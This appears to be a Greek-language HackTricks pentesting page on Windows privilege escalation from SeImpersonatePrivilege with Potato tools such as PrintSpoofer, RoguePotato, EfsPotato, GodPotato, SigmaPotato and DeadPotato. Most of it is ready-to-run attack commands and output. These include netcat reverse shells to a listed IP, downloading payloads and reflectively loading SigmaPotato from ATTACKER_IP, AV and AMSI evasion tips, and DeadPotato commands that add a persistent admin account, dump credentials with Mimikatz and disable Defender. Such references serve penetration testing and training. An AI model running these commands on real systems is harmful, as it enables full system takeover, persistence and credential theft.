# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> Το **JuicyPotato δεν λειτουργεί** σε Windows Server 2019 και Windows 10 build 1809 και νεότερες εκδόσεις. Ωστόσο, τα [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)** και **[**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** μπορούν να αξιοποιήσουν τα ίδια privileges και να αποκτήσουν πρόσβαση επιπέδου `NT AUTHORITY\SYSTEM`**. Αυτή η [ανάρτηση ιστολογίου](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) αναλύει διεξοδικά το εργαλείο `PrintSpoofer`, το οποίο μπορεί να χρησιμοποιηθεί για κατάχρηση των privileges impersonation σε συστήματα Windows 10 και Server 2019 όπου το JuicyPotato δεν λειτουργεί πλέον.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Μια σύγχρονη εναλλακτική που συντηρείται συχνά το 2024–2025 είναι το SigmaPotato (fork του GodPotato), το οποίο προσθέτει χρήση in-memory/.NET reflection και διευρυμένη υποστήριξη λειτουργικών συστημάτων. Δείτε παρακάτω τη σύντομη χρήση και το repo στις αναφορές.

Σχετικές σελίδες για το υπόβαθρο και τις χειροκίνητες τεχνικές:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Προϋποθέσεις και συνηθισμένα προβλήματα

Όλες οι παρακάτω τεχνικές βασίζονται στην κατάχρηση μιας privileged υπηρεσίας που υποστηρίζει impersonation, από ένα περιβάλλον που διαθέτει ένα από τα εξής privileges:

- SeImpersonatePrivilege (το συνηθέστερο) ή SeAssignPrimaryTokenPrivilege
- Δεν απαιτείται υψηλό integrity, εάν το token διαθέτει ήδη SeImpersonatePrivilege (κάτι συνηθισμένο για πολλούς λογαριασμούς υπηρεσιών, όπως IIS AppPool, MSSQL κ.λπ.)

Γρήγορος έλεγχος privileges:

```cmd
whoami /priv | findstr /i impersonate
```

Operational notes:

- Αν το shell σου εκτελείται με restricted token χωρίς SeImpersonatePrivilege (κάτι συνηθισμένο για Local Service/Network Service σε ορισμένα περιβάλλοντα), επανάφερε τα προεπιλεγμένα privileges του λογαριασμού με το FullPowers και, στη συνέχεια, εκτέλεσε ένα Potato. Παράδειγμα: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- Ένα process token μπορεί να έχει λιγότερα privileges από κάποιο άλλο token για τον ίδιο service account ή logon session. Σε ορισμένες διαμορφώσεις, ένας named-pipe client στην ίδια session μπορεί να αποκαλύψει διαφορετικό token με SeImpersonatePrivilege, αλλά τα `RequiredPrivileges` που έχουν οριστεί για την υπηρεσία και το `whoami /priv` περιγράφουν διαφορετικά πράγματα και δεν αποδεικνύουν ότι υπάρχει διαθέσιμο τέτοιο token. Επαλήθευσε το πραγματικό token πριν εξετάσεις ένα μονοπάτι impersonation.
- Το PrintSpoofer απαιτεί η υπηρεσία Print Spooler να εκτελείται και να είναι προσβάσιμη μέσω του τοπικού RPC endpoint (spoolss). Σε hardened περιβάλλοντα όπου το Spooler είναι απενεργοποιημένο μετά το PrintNightmare, προτίμησε τα RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- Το RoguePotato απαιτεί OXID resolver προσβάσιμο στη θύρα TCP/135. Αν το egress είναι αποκλεισμένο, χρησιμοποίησε redirector/port-forwarder (δες το παρακάτω παράδειγμα). Έλεγξε ποια flags υποστηρίζει το build που χρησιμοποιείς.
- Τα EfsPotato/SharpEfsPotato κάνουν abuse το MS-EFSR· αν ένα pipe είναι αποκλεισμένο, δοκίμασε εναλλακτικά pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Το σφάλμα 0x6d3 κατά το RpcBindingSetAuthInfo συνήθως υποδεικνύει άγνωστη/μη υποστηριζόμενη υπηρεσία authentication RPC· δοκίμασε διαφορετικό pipe/transport ή βεβαιώσου ότι εκτελείται η υπηρεσία-στόχος.
- Forks τύπου «Kitchen-sink», όπως το DeadPotato, περιλαμβάνουν επιπλέον payload modules (Mimikatz/SharpHound/Defender off) που γράφουν στον δίσκο· αναμένεται υψηλότερη ανίχνευση από EDR σε σύγκριση με τα slim originals.

## Γρήγορο Demo

### PrintSpoofer

```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

Σημειώσεις:
- Μπορείτε να χρησιμοποιήσετε το -i για να εκκινήσετε μια διαδραστική διεργασία στην τρέχουσα κονσόλα ή το -c για να εκτελέσετε μία εντολή.
- Απαιτείται η υπηρεσία Spooler. Αν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato

```bash
c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
```

Στο [upstream usage](https://github.com/antonioCoco/RoguePotato#usage), το `-e` ορίζει την εντολή, το `-l` επιλέγει την τοπική θύρα resolver και το προαιρετικό `-c` επιλέγει ένα CLSID. Αν η ενεργοποίηση COM εκκινήσει μια υπηρεσία της οποίας η διαδρομή εκτελέσιμου αρχείου είχε ήδη τροποποιηθεί, η υπηρεσία μπορεί να εκτελέσει την τροποποιημένη εντολή ανεξάρτητα από την πλαστοπροσωπία token· ελέγξτε τη διαμόρφωση της υπηρεσίας πριν αποδώσετε την παρατηρούμενη εκτέλεση ως SYSTEM σε αυτήν την τεχνική.

Αν η εξερχόμενη θύρα 135 είναι αποκλεισμένη, κάντε pivot στον OXID resolver μέσω socat στο redirector σας:<sup>[[9]](#references)</sup>

```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```

### PrintNotifyPotato

Το PrintNotifyPotato είναι ένα νεότερο primitive κατάχρησης COM, το οποίο κυκλοφόρησε στα τέλη του 2022 και στοχεύει την υπηρεσία **PrintNotify** αντί για τις Spooler/BITS. Το binary δημιουργεί instance του COM server PrintNotify, αντικαθιστά ένα fake `IUnknown` και, στη συνέχεια, ενεργοποιεί ένα privileged callback μέσω του `CreatePointerMoniker`. Όταν η υπηρεσία PrintNotify (που εκτελείται ως **SYSTEM**) συνδεθεί ξανά, η διεργασία αντιγράφει το token που επιστράφηκε και εκκινεί το παρεχόμενο payload με πλήρη δικαιώματα.<sup>[[13]](#references)</sup>

Βασικές επιχειρησιακές σημειώσεις:

* Λειτουργεί σε Windows 10/11 και Windows Server 2012–2022, εφόσον είναι εγκατεστημένη η υπηρεσία Print Workflow/PrintNotify (υπάρχει ακόμη και όταν η παλαιού τύπου Spooler είναι απενεργοποιημένη μετά το PrintNightmare).
* Απαιτεί το περιβάλλον εκτέλεσης που το καλεί να διαθέτει το **SeImpersonatePrivilege** (συνηθισμένο για λογαριασμούς υπηρεσιών IIS APPPOOL, MSSQL και προγραμματισμένων εργασιών).
* Δέχεται είτε απευθείας εντολή είτε interactive mode, ώστε να παραμείνετε στην αρχική κονσόλα. Παράδειγμα:

  ```cmd
  PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
  PrintNotifyPotato.exe whoami
  ```

* Επειδή βασίζεται αποκλειστικά στο COM, δεν απαιτούνται named-pipe listeners ή εξωτερικοί redirectors, καθιστώντας το άμεση αντικατάσταση σε hosts όπου το Defender μπλοκάρει το RPC binding του RoguePotato.

Χειριστές όπως η ομάδα Ink Dragon εκτελούν το PrintNotifyPotato αμέσως μετά την απόκτηση ViewState RCE στο SharePoint, ώστε να μεταβούν από το worker `w3wp.exe` στο SYSTEM πριν εγκαταστήσουν το ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato

```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```

### EfsPotato

```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```

Συμβουλή: Αν ένα pipe αποτύχει ή το EDR το μπλοκάρει, δοκιμάστε τα άλλα υποστηριζόμενα pipes:

```text
EfsPotato <cmd> [pipe]
  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```

### GodPotato

```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν υπάρχει το SeImpersonatePrivilege.
- Κατεβάστε το binary που αντιστοιχεί στο εγκατεστημένο runtime (π.χ., `GodPotato-NET4.exe` σε σύγχρονο Server 2022).
- Αν το αρχικό execution primitive είναι webshell/UI με σύντομα timeouts, αποθηκεύστε το payload ως script και ζητήστε από το GodPotato να το εκτελέσει αντί για μια μεγάλη inline command.<sup>[[12]](#references)</sup>

Γρήγορο staging pattern από ένα εγγράψιμο IIS webroot:

```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

Το DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν αντικείμενα DCOM υπηρεσιών, τα οποία από προεπιλογή χρησιμοποιούν το RPC_C_IMP_LEVEL_IMPERSONATE. Κάντε build ή χρησιμοποιήστε τα παρεχόμενα binaries και εκτελέστε την εντολή σας:

```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```

### SigmaPotato (updated GodPotato fork)

Το SigmaPotato προσθέτει σύγχρονες ευκολίες, όπως εκτέλεση στη μνήμη μέσω .NET reflection και ένα βοηθητικό εργαλείο για PowerShell reverse shell.<sup>[[8]](#references)</sup>

```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

Επιπλέον δυνατότητες στις εκδόσεις 2024–2025 (v1.2.x):
- Ενσωματωμένο flag για reverse shell `--revshell` και κατάργηση του ορίου των 1024 χαρακτήρων στο PowerShell, ώστε να μπορείτε να εκτελείτε με μία εντολή μεγάλα payloads που παρακάμπτουν το AMSI.
- Σύνταξη φιλική προς το Reflection (`[SigmaPotato]::Main()`), καθώς και ένα βασικό τέχνασμα αποφυγής AV μέσω του `VirtualAllocExNuma()` για να ξεγελά απλούς ευρετικούς μηχανισμούς.
- Ξεχωριστό `SigmaPotatoCore.exe`, μεταγλωττισμένο για .NET 2.0, για περιβάλλοντα PowerShell Core.

### DeadPotato (ανακατασκευή του GodPotato του 2024 με modules)

Το DeadPotato διατηρεί την αλυσίδα πλαστοπροσωπίας OXID/DCOM του GodPotato, αλλά ενσωματώνει βοηθητικά εργαλεία post-exploitation, ώστε οι χειριστές να μπορούν αμέσως να αποκτήσουν SYSTEM και να εκτελέσουν ενέργειες persistence/συλλογής δεδομένων χωρίς πρόσθετα εργαλεία.<sup>[[15]](#references)</sup>

Συνήθη modules (όλα απαιτούν SeImpersonatePrivilege):

- `-cmd "<cmd>"` — εκκίνηση οποιασδήποτε εντολής ως SYSTEM.
- `-rev <ip:port>` — γρήγορο reverse shell.
- `-newadmin user:pass` — δημιουργία τοπικού admin για persistence.
- `-mimi sam|lsa|all` — εγκατάσταση και εκτέλεση του Mimikatz για εξαγωγή διαπιστευτηρίων (εγγράφει στον δίσκο και είναι θορυβώδες).
- `-sharphound` — εκτέλεση συλλογής δεδομένων με το SharpHound ως SYSTEM.
- `-defender off` — απενεργοποίηση της προστασίας πραγματικού χρόνου του Defender (πολύ θορυβώδες).

Παραδείγματα εντολών μίας γραμμής:

```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```

Επειδή περιλαμβάνει επιπλέον binaries, αναμένετε περισσότερα flags από AV/EDR· χρησιμοποιήστε το ελαφρύτερο GodPotato/SigmaPotato όταν έχει σημασία το stealth.

## References

- [1] [PrintSpoofer – Κατάχρηση προνομίων impersonation στα Windows 10 και Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [Τέλος το JuicyPotato; Παλιές ιστορίες, καλωσόρισες RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Επαναφορά των προεπιλεγμένων προνομίων token για λογαριασμούς υπηρεσιών](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato προς SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — macro του LibreOffice → IIS webshell → GodPotato προς SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Μέσα στο Ink Dragon: Αποκαλύπτοντας το δίκτυο αναμετάδοσης και την εσωτερική λειτουργία μιας stealthy επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Ανανεωμένη έκδοση του GodPotato με ενσωματωμένα post-ex modules](https://github.com/lypd0/DeadPotato)
{{#include ../../banners/hacktricks-training.md}}
